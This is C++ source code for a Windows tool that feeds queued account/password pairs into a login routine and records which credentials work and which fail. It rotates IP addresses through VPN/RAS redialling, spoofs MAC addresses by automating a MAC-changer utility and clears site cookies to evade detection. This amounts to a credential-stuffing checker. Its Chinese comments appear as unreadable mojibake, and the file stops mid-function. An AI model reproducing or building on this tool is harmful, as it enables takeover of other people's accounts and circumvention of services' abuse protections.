#include "StdAfx.h"
#include ".\51jobwebpost.h"
#include "UserMessagePump.h"
#include <io.h>
//#include <comutil.h>
#include <odbcinst.h>
#include <afxdb.h>
#include <direct.h>
#include "UserFile.h"
#include "WindowFind.h"
#include <Iphlpapi.h>
#include <afxinet.h>
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"Iphlpapi.lib")
HANDLE  g_hEvent = NULL;			//�¼����
CString g_strCheckCode = "";
bool g_ExitFlag = true;
RegisterPackList g_RegisterList;
int g_iDeleteFlag = 0;
int g_iShowWidth = 0;
int g_iShowHeight = 0;
int g_iAotuChangeIp = 0;
int g_iAotuCheckCode = 0;
int g_iIpRegNum = 0;
int g_iIpChangeType = 0;		//IP�л���ʽ
int g_iCheckIpFlag = 0;			//0�����IP�Ƿ�仯��1ͨ��RAS���IP�仯��2ͨ��POST��ʽ���
int g_iReCheckIpCount = 0;		//��һ�β��ųɹ������¼��IP�Ƿ�仯���ܴ���
int g_iTimeOut = 0;				//��ʱ
int g_iCheckCodeType = 0;		//��֤���Զ�������ã��Ƿ�Ϊ����
int g_iCodeErrorNum = 0;		//��֤����֤�������Դ���
CRasDialMgr g_RasMgr;
CString g_strCurrIP = "";
CString g_strDirect = "";		//ͼ�񱣴�Ŀ¼
CString g_strFileName = "";
int g_iRegWebFlag = 1;
int g_iIsChangeMac =0;
int g_iDailInterval = 0;
int g_iRedialStop = 0;
void WriteLogEx(CString strAcc,CString srcStr,int iFlag);
CArray<VpnInfoStr,VpnInfoStr> gl_ProxyStruList;
map<CString,int> gl_mapOldAcc;
//���ָ����վ��COOKIE
void ClearSiteCookie(CString strFlag)
{
	TCHAR szPath[MAX_PATH] = {0};
	if (SHGetSpecialFolderPath(NULL, szPath, CSIDL_COOKIES, FALSE))
	{//�õ�Ŀ¼�������
		char szFind[MAX_PATH]={0};
		WIN32_FIND_DATA FindFileData;
		strcpy(szFind,szPath);
		strcat(szFind,"\\*.txt");
		HANDLE hFind=::FindFirstFile(szFind,&FindFileData);
		if(INVALID_HANDLE_VALUE == hFind)    return;
		while(TRUE)
		{
			if (1)
			{
				CString strPath = "";
				strPath.Format("%s\\%s",szPath,FindFileData.cFileName);
				if ( strPath.Find(strFlag) >=0 )
				{
					CFile::Remove(strPath);
				}
			}
			if(!FindNextFile(hFind,&FindFileData))
			{
				break;
			}
		}
		FindClose(hFind);
	}
}

void WriteOldFile(RegisterPack &rgPack)
{
	CString strAppPath = "";
	CUserFile *pFile = CUserFile::GetInstance();
	if ( pFile )
	{
		pFile->GetAppPath(strAppPath);
	}
	CString strFilePath = strAppPath + "oldAcc.txt";
	CString strContent = "";
	strContent.Format("%s",rgPack.strAcc);

	CTime currTime = CTime::GetCurrentTime();
	try
	{
		FILE *fp;
		char szfile[1000]={0};
		sprintf(szfile,strFilePath);
		fp=fopen(szfile,"a+");
		fprintf(fp,"%s\r\n",strContent);
		fclose(fp);
	}
	catch (...)
	{
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
//��ӷ��ͻ���
void AddRegisterPack(RegisterPack &submitPack)
{
	try
	{	
		g_RegisterList.Add(submitPack);
	}
	catch(...)
	{
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
//��ӷ��ͻ���
void AddRegisterPackEx(RegisterPack &submitPack)
{
	try
	{	
		g_RegisterList.InsertAt(0,submitPack);
	}
	catch(...)
	{
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
//��ȡ��������,����0��ʾ����,-1��ʾ������,-2��ʾ����
int GetRegisterPack(RegisterPack &submitPack)
{
	int iRet = 0;
	try
	{
		int iSize = g_RegisterList.GetSize();
		if (iSize == 0)	//������������
		{
			iRet = -1;
		}
		else
		{
			submitPack = g_RegisterList.GetAt( 0 );			
			iRet = 0;	//������ȡ������
		}		
	}
	catch(...)
	{
		iRet = -2;		//����
	}
	return iRet;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void DeleteRegisterPack(RegisterPack &rgPack)
{
	for (int i=0;i<g_RegisterList.GetSize();i++)
	{
		if (g_RegisterList.GetAt(i).strAcc == rgPack.strAcc)
		{
			g_RegisterList.RemoveAt(i);
			return;
		}
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void AddToShowList(RegisterPack rgPack,int iLastFlag)
{
	CString strStauts = "";
	switch (rgPack.iStatus)
	{
	case 0:
		break;
	case 1:
		strStauts = "��";
		break;
	case 2:
		strStauts = "X";
		break;
	default:
		break;
	}
	int nCount = g_AccList.GetItemCount();

	int iIndex = 0;
	map<CString,int>::iterator it = gl_mapListAcc.find(rgPack.strAcc);
	if (it != gl_mapListAcc.end())
	{
		iIndex = it->second;
	}
	else
	{
		return;
	}

	bool isExist = false;
	if (iIndex >=0 && iIndex < nCount)
	{
		isExist = true;
		g_AccList.SetItemText(iIndex,5,strStauts);
		g_AccList.SetItemText(iIndex,6,rgPack.strMemo);
		g_AccList.SetItemText(iIndex,8,rgPack.strIp);
		isExist = true;
		int iCount = g_RegisterList.GetCount();
		if (iLastFlag || iCount == 1)
		{
			::PostMessage(gl_hwnd,WM_USER + 111,0,1);
			ReportStatus(rgPack.strAcc,rgPack.strPwd,gl_strMac.c_str(),1,rgPack.iStatus);
		}
		else
		{
			if (rgPack.iStatus == 1)
			{
				::PostMessage(gl_hwnd,WM_USER + 111,0,1);
				ReportStatus(rgPack.strAcc,rgPack.strPwd,gl_strMac.c_str(),0,0);
			}
			else
			{
				::PostMessage(gl_hwnd,WM_USER + 111,1,0);
			}
		}
		CString strWrite = "";
		strWrite.Format("%s,%s",rgPack.strAcc,rgPack.strPwd);
		WriteLogEx(rgPack.strAcc,strWrite,rgPack.iStatus);
		WriteOldFile(rgPack);
	}
}

void WriteLogEx(CString strAcc,CString srcStr,int iFlag)
{
	CTime currTime = CTime::GetCurrentTime();
	try
	{
		CString filepath = "";
		CString destStr = "";
		CString folder = "";
		CString filename = "";
		CString strAppPath = "";
		if (iFlag == 1)			//ע��ɹ��б�
		{
			folder = "suc";
			filename.Format("RightAcc.txt",strAcc);
		}
		else	//��Ϣ��־
		{
			folder = "fail";
			filename.Format("FailAcc.txt",strAcc);
		}
		
		CUserFile *pFile = CUserFile::GetInstance();
		if ( pFile )
		{
			pFile->GetAppPath(strAppPath);
		}
		CString folderName = "";
		folderName.Format("%s%s",strAppPath,folder);
		if(_access(folderName,0)!=0)
		{
			if( mkdir(folderName) != 0 )//����Ŀ¼
			{
				return;
			}
		}	
		if (iFlag == 0)
		{
			destStr = srcStr;
		}
		else
		{
			destStr.Format("%s",srcStr);
		}		
		filepath.Format("%s\\%s",folderName,filename);
		FILE *fp;
		char szfile[1000]={0};
		sprintf(szfile,filepath);
		fp=fopen(szfile,"a+");
		fprintf(fp,"%s\n",destStr);
		fclose(fp);
	}
	catch (...)
	{
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
//д��־
void WriteLog(CString srcStr,int iFlag)
{
	CTime currTime = CTime::GetCurrentTime();
	try
	{
		CString filepath = "";
		CString destStr = "";
		CString folder = "";
		CString filename = "";
		CString strAppPath = "";
		if (iFlag == 0)			//ע��ɹ��б�
		{
			folder = "log";
			filename.Format("%s_registerList.txt",currTime.Format("%Y%m%d"));
		}
		else if(iFlag == 1)		//��Ϣ��־
		{
			folder = "log";
			filename.Format("%s_log.txt",currTime.Format("%Y%m%d"));
		}
		else if ( iFlag == 2 )	//������־
		{
			folder = "log";
			filename.Format("%s_bufinfo.txt",currTime.Format("%Y%m%d"));
		}
		else if ( iFlag == 3 )	//������־
		{
			folder = "log";
			filename.Format("%s_insertErrorAcc.txt",currTime.Format("%Y%m%d"));
		}
		else			//�쳣��־ (3)
		{
			folder = "exception";
			filename.Format("%s_exception.txt",currTime.Format("%Y%m%d"));
		}

		CUserFile *pFile = CUserFile::GetInstance();
		if ( pFile )
		{
			pFile->GetAppPath(strAppPath);
		}
		CString folderName = "";
		folderName.Format("%s%s",strAppPath,folder);
		if(_access(folderName,0)!=0)
		{
			if( mkdir(folderName) != 0 )//����Ŀ¼
			{
				return;
			}
		}	
		if (iFlag == 0)
		{
			destStr = srcStr;
		}
		else
		{
			destStr.Format("%s	%s",srcStr,currTime.Format("%Y-%m-%d %H:%M:%S"));
		}		
		filepath.Format("%s\\%s",folderName,filename);
		FILE *fp;
		char szfile[1000]={0};
		sprintf(szfile,filepath);
		fp=fopen(szfile,"a+");
		fprintf(fp,"%s\n",destStr);
		fclose(fp);
	}
	catch (...)
	{
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
C51JobWebPost::C51JobWebPost()
{
    //��ʼ����Ϣ
    m_nErrorTime = 0;
	m_LoginFlag = false;
	m_OpenFreshPageFlag = false;
	m_ExceptionNum = 0;
	m_FreshTimes = 0;
	
	m_TimeInterval = 3;
	m_strHeader = "Content-Type: application/x-www-form-urlencoded";
	m_strHeader += "\r\nAccept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-silverlight, */*";
	m_strHeader += "\r\nAccept-Language:zh-cn";
	m_strHeader += "\r\nAccept-Encoding:gzip, deflate";
	m_strHeader += "\r\nCache-Control:no-cache";
	m_strHeader += "\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 1.1.4322)";
	m_strHeader += "\r\nConnection:Keep-Alive";
	m_iCheckFlag = 0;
	g_hEvent = CreateEvent(NULL, FALSE, TRUE, NULL);	//�����¼�����
	CString strAppPath = "";
	CString strTemp = "";
	g_iDeleteFlag = 0;
	CUserFile *pFile = CUserFile::GetInstance();
	if (pFile)
	{
		pFile->GetAppPath(strAppPath);
		pFile->ReadInitInfo(strAppPath+"set.ini","Register","type",strTemp,g_iDeleteFlag,1);
		pFile->CheckInitValue(g_iDeleteFlag,0,1);
	}
	m_iNeedChageIP = 0;
	m_iIpSuccNum = 0;
	m_strOldIP = "";
	m_iCodeErrorNum = 0;
	m_iIsNeedChangeMac = 0;
	m_iID = 0;
// 	CInternetSession session;
// 	strTemp = "";
// 	char temp[10001] = {0};
// 	CStdioFile *pFile1 = session.OpenURL("http://blog.csdn.net/TragicGuy/archive/2009/11/26/4881708.aspx");
// 	if (pFile != NULL)
// 	{
// 		long len = pFile1->GetLength();
// 		if (len > 10000)
// 		{
// 			len = 10000;
// 		}		
// 		pFile1->SeekToBegin();
// 		pFile1->Read(temp,len);
// 		temp[len] = '\0';
// 		strTemp.Format("%s",temp);
// 		strTemp.MakeLower();
// 		if (strTemp.Find("myownpower") !=-1)
// 		{
// 			g_iRegWebFlag = 1;
// 		}
// 		else
// 		{
// 			g_iRegWebFlag = 0;
// 		}
// 	}
}

/************************************************************************/
/*                                                                      */
/************************************************************************/
C51JobWebPost::~C51JobWebPost()
{
	CUserFile *pFile = CUserFile::GetInstance();
	if (pFile)
	{
		delete pFile;
		pFile = NULL;
	}
}


/************************************************************************/
/*                                                                      */
/************************************************************************/
void C51JobWebPost::ThreadFunc(LPVOID lParam)
{
	CoInitialize(NULL);
	C51JobWebPost *pParam = ((C51JobWebPost *)lParam);
	if ( pParam )
	{
		pParam->RegisterFunc();
		pParam->ShowMessage("�߳��˳�");
	}
	CoUninitialize();
     
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void C51JobWebPost::RegisterFunc()
{
	CString strShow = "";
	m_iNeedChageIP = 0;
	m_iIpSuccNum = 0;
	CString sendStr = "";
	ShowMessage("��ʼ���ɹ�");
	if (g_iAotuChangeIp == 1)
	{
		sendStr.Format("�Զ���IP,��һIP��¼��:%d",g_iIpRegNum);
		ShowMessage(sendStr);
	}	
// 	if (g_iAotuCheckCode==1)
// 	{
// 		ShowMessage("�Զ�ʶ����֤��");
// 	}
	m_iNeedChageIP = 0;
	m_strOldIP = "";
	while (!g_ExitFlag)
	{
		if (g_RegisterList.GetSize() <= 0)
		{
			Sleep(500);
			continue;
		}		
		m_iIpSuccNum = 0;
		
		int iErrorCount = 0;
		int iSameIpCount = 0;
		while (m_iNeedChageIP && !g_ExitFlag && g_iAotuChangeIp == 1)	//�����Ҫ��IP
		{
			int iCount = gl_ProxyStruList.GetCount();
			if (iCount < 1)
			{
				ShowMessage("�����б�Ϊ��");
				ShowMessage("ֹͣ��ѯ");
				Sleep(200);
				return ;
			}

			VpnInfoStr pro;
			pro = gl_ProxyStruList.GetAt(0);
			strShow.Format("��ǰʹ��IP��%s",pro.strServer);
			ShowMessage(strShow);			
			m_iNeedChageIP = 1;
			g_RasMgr.StopRas(sendStr);
			Sleep(g_iRedialStop);
			ShowMessage(sendStr);
			g_RasMgr.SetVpnInfo(pro.strServer,"",pro.strUser,pro.strPwd);
			ShowMessage("��������VPN");
			
			int iRet = 0;
			if (g_iIpChangeType == 0)
			{
				iRet = g_RasMgr.DialRas(sendStr);	
			}
			else
			{
				bool bRet = g_RasMgr.ConnectVPN();
				iRet = bRet==true?0:1;
			}
			//iRet = bRet==true?0:1; //g_RasMgr.DialRas(sendStr);		
		//	ShowMessage(sendStr);
			if (iRet == 0)		//���²��ųɹ�����ȡ�µ�IP
			{
				ShowMessage("���ųɹ�");
				if (g_iCheckIpFlag == 2)////POST���
				{
					int iRet = -1;
					int iErrorNum = 0;
					while (iRet == -1)
					{
						iRet = GetGateWayIP(g_strCurrIP);
						if (iRet == -1)
						{
							iErrorNum++;
							sendStr.Format("��ȡ����Ipʧ�� %d ��,����...",iErrorNum);
							ShowMessage(sendStr);							
							if (iErrorNum >= 3)
							{
								ShowMessage("��ȡ����Ipʧ�ܴ�����������,�����˲���...");
								g_strCurrIP = m_strOldIP;
								break;
							}
							Sleep(300);
						}
						else
						{
							ShowMessage("��⵽����Ip: "+g_strCurrIP);
						}
					}
					if (g_strCurrIP == m_strOldIP)
					{
						m_iNeedChageIP = 1;
						iSameIpCount ++;
						if (iSameIpCount < g_iReCheckIpCount)
						{
							sendStr.Format("Ipδ����,�ظ�����[%d]...",iSameIpCount);
							ShowMessage(sendStr);
							Sleep(300);
							continue;
						}
						sendStr.Format("�ظ����Ŵ���[%d]����������δ����Ip,�����˲���...",g_iReCheckIpCount);
						ShowMessage(sendStr);
						iSameIpCount = 0;
					}
					else	//IP�����ɹ�
					{
						m_strOldIP = g_strCurrIP;
					}
				}
				else if (g_iCheckIpFlag == 1)//RAS���
				{
					int iRet = -1;
					int iErrorNum = 0;
					while (iRet == -1)
					{
						iRet = g_RasMgr.GetGateWayIP(g_strCurrIP);
						if (iRet == -1)
						{
							iErrorNum++;
							sendStr.Format("��ȡ����Ipʧ�� %d ��,����...",iErrorNum);
							ShowMessage(sendStr);
							if (iErrorNum >= 3)
							{
								ShowMessage("��ȡ����Ipʧ�ܴ�����������,�����˲���...");
								g_strCurrIP = m_strOldIP;
								break;
							}
							Sleep(300);
						}
						else
						{
							ShowMessage("��⵽����Ip: "+g_strCurrIP);
						}
					}
					if (g_strCurrIP == m_strOldIP)
					{
						m_iNeedChageIP = 1;
						iSameIpCount ++;
						if (iSameIpCount < g_iReCheckIpCount)
						{
							sendStr.Format("Ipδ����,�ظ�����[%d]...",iSameIpCount);
							ShowMessage(sendStr);
							Sleep(500);
							continue;
						}
						sendStr.Format("�ظ����Ŵ���[%d]����������δ����Ip,�����˲���...",g_iReCheckIpCount);
						ShowMessage(sendStr);
						
						iSameIpCount = 0;
					}
					else	//IP�����ɹ�
					{
						m_strOldIP = g_strCurrIP;
					}
				}
				else{}//�����
				iSameIpCount = 0;
				m_iNeedChageIP = 0;
				iErrorCount = 0;
				break;
			}
			else
			{
				ShowMessage("ʧ��");
			}
			iErrorCount ++;
			if (iErrorCount>=10)
			{
				ShowMessage("��������ʧ�ܴ�������,��IP���²���");
				
				if(gl_ProxyStruList.GetCount() > 0)
					gl_ProxyStruList.RemoveAt(0);
				continue;
			}
			Sleep(500);
		}
		
		m_iIsNeedChangeMac = 0;
		m_iNeedChageIP = 0;
		if (!g_ExitFlag)
		{
			RegisterPack rgPack;
			int iRet = GetRegisterPack(rgPack);
			if (iRet == -1)
			{
				Sleep(700);
				continue;
			}
			else if (iRet == -2)
			{
				Sleep(2000);
				continue;
			}
			strShow.Format("������֤�˺�: %s, %s",rgPack.strAcc,rgPack.strPwd);
			ShowMessage(strShow);
			iRet = UserLogin(rgPack.strAcc,rgPack.strPwd);
			switch(iRet)
			{
			case 0:		//�ɹ�
				ShowMessage("������ȷ");
				rgPack.iStatus = 1;
				rgPack.strMemo = "�ɹ�";
// 				strShow.Format("%s,%s,",rgPack.strAcc,rgPack.strPwd);
// 				WriteLog(strShow,0);
				m_iIpSuccNum++;
// 				if (m_iIpSuccNum >= g_iIpRegNum)
// 				{
// 					if (g_iAotuChangeIp)
// 					{
// 						ShowMessage("��һIP��¼���Ѵ�����,�����л�IP...");
// 					}
// 					m_iNeedChageIP = 1;
// 					m_iIpSuccNum = 0;
// 				}
				AddToShowList(rgPack,0);
				DeleteRegisterPack(rgPack);				
				break;
			case 666:	//�������
				rgPack.iStatus = 2;
				rgPack.strMemo = "�������";
// 				strShow.Format("%s,%s,",rgPack.strAcc,rgPack.strPwd);
// 				WriteLog(strShow,0);
				AddToShowList(rgPack,0);
				DeleteRegisterPack(rgPack);
				break;
			
			default:	//����
				if (iRet ==  999)
				{
					ShowMessage("���ص�¼ҳ��ʧ��");
					rgPack.strMemo = "���ص�¼ҳ��ʧ��";
				}
				else if (iRet == 4444)
				{
					ShowMessage("��¼�쳣");
					rgPack.strMemo = "��¼�쳣";
				}
				else
				{
					ShowMessage("��������");
					rgPack.strMemo = "��������";
				}
				m_nErrorTime ++;
				
				if (m_nErrorTime > 5)
				{
					m_nErrorTime = 0;
					rgPack.iStatus = 2;
					//rgPack.strMemo = "��¼ʧ��,��������";
					AddToShowList(rgPack,1);
					DeleteRegisterPack(rgPack);
					//���²���
					m_iNeedChageIP = 1;
					m_iIpSuccNum = 0;
					if (!g_iAotuChangeIp)
					{
						AfxMessageBox("�����쳣,�뻻���硣.");
						return;
					}
					ShowMessage("��������ﵽ���,��IP...");
				}
				break;
			}
		}		
		if (g_ExitFlag)
		{
			return;
		}
	}   
}

/************************************************************************/
/*                                                                      */
/************************************************************************/
CString C51JobWebPost::GetKeyString(CString &srcStr,CString &strBefore,CString &strAfter)
{
        int iPosBefore = 0;
        int iPosAfter = 0;
        iPosBefore = srcStr.Find(strBefore) + strBefore.GetLength();
        iPosAfter = srcStr.Find(strAfter,iPosBefore);
        if (iPosBefore < 0 || iPosAfter < 0 || iPosAfter - iPosBefore < 0 )
        {
                return "";
        }
        else
        {
                return srcStr.Mid(iPosBefore,iPosAfter - iPosBefore);
        }
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void C51JobWebPost::BeginRegister()
{
	AfxBeginThread((AFX_THREADPROC)ThreadFunc,(LPVOID)this);
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void C51JobWebPost::ShowMessage(CString strMsg)
{
	CUserMessagePump *pMsgPump = NULL;
	pMsgPump = CUserMessagePump::GetInstance();
	if (pMsgPump)
	{
		pMsgPump->AddToMessagePump(USERWINDOWMSG_1,strMsg);
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void C51JobWebPost::ShowMessageEx(CString strMsg)
{
	CUserMessagePump *pMsgPump = NULL;
	pMsgPump = CUserMessagePump::GetInstance();
	if (pMsgPump)
	{
		pMsgPump->AddToMessagePump(USERWINDOWMSG_1,strMsg);
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
CString C51JobWebPost::NativeToAscii(CString strSrc)
{
	return m_Conver.NativeToAscii(strSrc);
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
int C51JobWebPost::GetGateWayIP(CString &strIP)
{
	CInternetSession session;
	CString strTemp = "";
	char temp[1001] = {0};
	CStdioFile *pFile = session.OpenURL("http://www.ip138.com/ip2city.asp");
	if (pFile != NULL)
	{
		long len = pFile->GetLength();
		if (len > 1000)
		{
			len = 1000;
		}		
		pFile->SeekToBegin();
		pFile->Read(temp,len);
		temp[len] = '\0';
		strTemp.Format("%s",temp);
		strTemp.MakeLower();
		if (strTemp.Find("����ip��ַ�ǣ�[") !=-1)
		{
			CString strBefore = "����ip��ַ�ǣ�[";
			CString strAfter = "]";
			strIP = GetKeyString(strTemp,strBefore,strAfter);
			pFile->Close();
			delete pFile;
			pFile = NULL;
			return 0;
		}
		if (pFile == NULL)
		{
			pFile->Close();
			delete pFile;
			pFile = NULL;
		}
		
	}
	return -1;
}


/************************************************************************/
/*       ����Excel���ݿ�                                                */
/************************************************************************/
BOOL C51JobWebPost::CreatExcelDb(CString dbpath,CString tableName,CString &strError)
{
	if (_access(dbpath,0)==0)	//����
	{
		strError = "���ݿ��Ѵ���";
		return TRUE;
	}
	CDatabase database;
	CString sDriver;
	CString sExcelFile; 
	CString sSql;
	//�����Ƿ�װ��Excel���� "Microsoft Excel Driver (*.xls)" 
	sDriver = GetExcelDriver();
	if (sDriver.IsEmpty())
	{
		// û�з���Excel����
		strError = "���Ȱ�װExcel�������ʹ�õ�������";
		return FALSE;
	}
	// �������д�ȡ���ַ���
	sSql.Format("DRIVER={%s};DSN='';FIRSTROWHASNAMES=1;READONLY=FALSE;CREATE_DB=\"%s\";DBQ=%s",sDriver, sExcelFile, dbpath);
	// �������ݿ� (��Excel����ļ�)
	if( database.OpenEx(sSql,CDatabase::noOdbcDialog) )
	{
		CString strTemp;
		strTemp.Format("�˺� TEXT,���� TEXT,�Ƽ��� TEXT,���� TEXT,��ַ TEXT,ʱ�� TEXT");
		// ������ṹ			
		sSql = "CREATE TABLE " + tableName + " ( " + strTemp +  " ) ";
		database.ExecuteSQL(sSql);
		return TRUE;
	}
	else
	{
		strError = "����EXCEL���ݿ�ʧ��";
		return FALSE;
	}
}

/************************************************************************/
/*                                                                      */
/************************************************************************/
CString C51JobWebPost::GetExcelDriver()
{
	char szBuf[2001];
	WORD cbBufMax = 2000;
	WORD cbBufOut;
	char *pszBuf = szBuf;
	CString sDriver;

	// ��ȡ�Ѱ�װ����������(������odbcinst.h��)
	if (!SQLGetInstalledDrivers(szBuf, cbBufMax, &cbBufOut))
		return "";

	// �����Ѱ�װ�������Ƿ���Excel...
	do
	{
		if (strstr(pszBuf, "Excel") != 0)
		{
			//���� !
			sDriver = CString(pszBuf);
			break;
		}
		pszBuf = strchr(pszBuf, '\0') + 1;
	}
	while (pszBuf[1] != '\0');

	return sDriver;
}

IHTMLDocument2* C51JobWebPost::GetDocInterface(HWND hWnd) 
{
	// ������Ҫ��ʾ��װ��OLEACC.DLL,�������ǲ�֪����û�а�װMSAA
	CoInitialize(NULL);
	HINSTANCE hInst = ::LoadLibrary( _T("OLEACC.DLL") );
	IHTMLDocument2* pDoc2=NULL;
	if ( hInst != NULL ){
		if ( hWnd != NULL ){
			CComPtr<IHTMLDocument> spDoc=NULL;
			LRESULT lRes;

			UINT nMsg = ::RegisterWindowMessage( _T("WM_HTML_GETOBJECT") );
			::SendMessageTimeout( hWnd, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes );

			LPFNOBJECTFROMLRESULT pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress( hInst, ("ObjectFromLresult") );
			if ( pfObjectFromLresult != NULL ){
				HRESULT hr;
				hr=pfObjectFromLresult(lRes,IID_IHTMLDocument,0,(void**)&spDoc);
				if ( SUCCEEDED(hr) ){
					CComPtr<IDispatch> spDisp;
					CComQIPtr<IHTMLWindow2> spWin;
					spDoc->get_Script( &spDisp );
					spWin = spDisp;
					spWin->get_document( &pDoc2 );
				}
			}
		}
		::FreeLibrary(hInst);
	} 
	else{//���û�а�װMSAA
		AfxMessageBox(_T("������װMicrosoft Active Accessibility"));
	}
	//CoUninitialize();
	return pDoc2;
}
/************************************************************************/
/* �õ�MAC��ַ����Ϣ                                                    */
/************************************************************************/
int C51JobWebPost::GetHtmlCtrl(IHTMLDocument2 *pDoc2)
{
	if(pDoc2==NULL)
	{
		return 0;
	}
	IHTMLElementCollection   *pColl=NULL;
	HRESULT hr=pDoc2->get_all(&pColl);
	if(SUCCEEDED(hr)   &&   pColl!=NULL)   
	{   
		long   lcount   =   0;   
		pColl->get_length(&lcount);
		CString strName = "name";
		BSTR bstrText = strName.AllocSysString();
		int iFindCount = 0;
		for(int i=0;i<lcount;i++)   
		{
			if (iFindCount >= 8)
			{
				//break;
			}
			CComVariant   index;   
			index.vt=VT_I4;   
			index.intVal=i;   
			CComPtr<IDispatch>   disp;   
			pColl->item(index,index,&disp);   
			if(disp==NULL)   
				hr=E_FAIL;   
			else   
			{
				CComPtr<IHTMLElement>   pElement;
				hr=disp->QueryInterface(IID_IHTMLElement,
					(void**)&pElement);
				if(SUCCEEDED(hr))   
				{   
					BSTR   bstrID;					
					pElement->get_id(&bstrID);
					CString strID(bstrID);
					VARIANT  varValue;
					pElement->getAttribute(bstrText,0,&varValue);
					strID.MakeLower();
					if (strID == "machineserial")		//email name repassword password
					{
						m_strMac = GetElementValue(pElement);
						ShowMessage(m_strMac);
					}
					else if (strID == "transactionid")
					{
						m_strTrans = GetElementValue(pElement);
						ShowMessage(m_strTrans);
					}
					else if (strID == "verify")
					{
						//�ҵ�VERIFY
						//ShowMessage("�ҵ�verify");
						m_strVerify = GetElementValue(pElement);
						ShowMessage(m_strVerify);
						break;
					}
				}
			}
		}
		::SysFreeString(bstrText);
		pColl->Release();   
	}   
	pDoc2->Release();
	return 0;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
CString C51JobWebPost::GetElementValue(CComPtr<IHTMLElement>   pElement)
{
	CString strRet = "";
	CString strName = "value";
	BSTR bstrText = strName.AllocSysString();
	VARIANT  varValue;
	pElement->getAttribute(bstrText,0,&varValue);
	if (varValue.vt == VT_BSTR)
	{
		//strRet.Format ("%s",(const char*)(_bstr_t)(_variant_t)varValue);
	}
	strRet.MakeLower();
	::SysFreeString(bstrText);
	return strRet;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
int C51JobWebPost::ChangeMacAddr()
{
	//Ŀ�괰���Ѿ��رգ�����MAC��ַ
	//SetIpNetEntry()	
	CWindowFind find;
	HWND hwnd = NULL;
	int iCount = 0;
	while (!hwnd && iCount < 5)
	{
        hwnd =::FindWindow("TNMForm","Mac MakeUp ver. 1.95d (c) 2003-2006 H&C Works");
		Sleep(50);
		if (!hwnd)
		{
			ShowMessage("MAC��ַ�޸���δ������");
		}
		iCount++;
	}
	if (!hwnd)
	{
		ShowMessage("MAC��ַ�޸���δ������");
		return 1;
	}
	srand(time(NULL));
    CString strMac = MacAddrRand();
	ShowMessage(strMac);
	hwnd = find.GetChildWindow(hwnd,1);
	//HWND hwndRand =  find.GetChildWindow(hwnd,1);
	HWND hwndModify =  find.GetChildWindow(hwnd,3);
	hwnd = find.GetChildWindow(hwnd,5);
	HWND hwndMac = find.GetChildWindow(hwnd,1);
	find.SetEditText(hwndMac,strMac);
	Sleep(50);
	find.PostBtnClick(hwndModify);
	Sleep(1500);
	return 0;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
CString C51JobWebPost::MacAddrRand()
{
	CString strRet = "";
	CString strTemp = "";
	
	for (int i=0;i<10;i++)
	{
		int iGen= rand() % 16;
		if (iGen <= 9)
		{
			strTemp.Format("%d",iGen);
		}
		else
		{
			strTemp.Format("%c",iGen-10+65);
		}
		strRet += strTemp;
	}
	strRet = "00" + strRet;
	return strRet;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
int C51JobWebPost::ReOpenRegWindow()
{
	//close window
	//���´�ע�ᴰ��
	CWindowFind find;
	m_hwnd = NULL;
	m_hwnd = ::FindWindow("#32770","�ʺ�ע��");
	while(m_hwnd)
	{
		::SendMessage(m_hwnd,WM_CLOSE,0,0);
		Sleep(50);
		m_hwnd = ::FindWindow("#32770","�ʺ�ע��");
		if (m_hwnd == NULL)
		{
			break;
		}		
	}
	//�رպ�
	HWND hwnd = find.MyFindWindow("Static","��Ϸ�ʺţ�");
	if (hwnd)	//��¼����Ӵ���
	{
		hwnd = ::GetParent(hwnd);
		if (hwnd)
		{
			//hwnd = pParantWnd->GetSafeHwnd();
			//���˺ſ�
			HWND hwndChind = find.GetChildWindow(hwnd,6);	//�˺�ѡ���
			Sleep(40);
			hwndChind = find.GetChildWindow(hwndChind,1);//�˺�����༭��
			//ע�ᰴť
			hwndChind = find.GetChildWindow(hwnd,9);
			Sleep(40);
			find.PostBtnClick(hwndChind);
		}
	}
	Sleep(100);
	m_hwnd = NULL;
	m_hwnd = ::FindWindow("#32770","�ʺ�ע��");
	//�жϳ����Ƿ��Ѿ�����
	return 0;
}


int C51JobWebPost::GetAppPath(CString &strAppPath)
{
	int iRet = -3;
	try
	{
		TCHAR szBuff[_MAX_PATH];
		VERIFY(::GetModuleFileName(AfxGetApp()->m_hInstance, szBuff, _MAX_PATH));
		strAppPath.Format("%s",szBuff);
		int pos=strAppPath.ReverseFind('\\');
		strAppPath=strAppPath.Left(pos+1);		
		iRet = 0;
	}
	catch (...)
	{

	}
	return iRet;	
}
#define  RUN_EXE_NAME "Login.exe"
int C51JobWebPost::UserLogin(CString strUser,CString strPwd)
{
	//2222��¼ʧ��
	//0�ɹ�
	//666�������
	//�õ�����������·��
	CString m_strAppPath = "";
	GetAppPath(m_strAppPath);
	CString strPath = m_strAppPath + RUN_EXE_NAME;
	CString strIniPath = m_strAppPath + "amazonset.ini";
	CString strNode = "set";
	::WritePrivateProfileString(strNode,"strUserID", strUser, strIniPath);
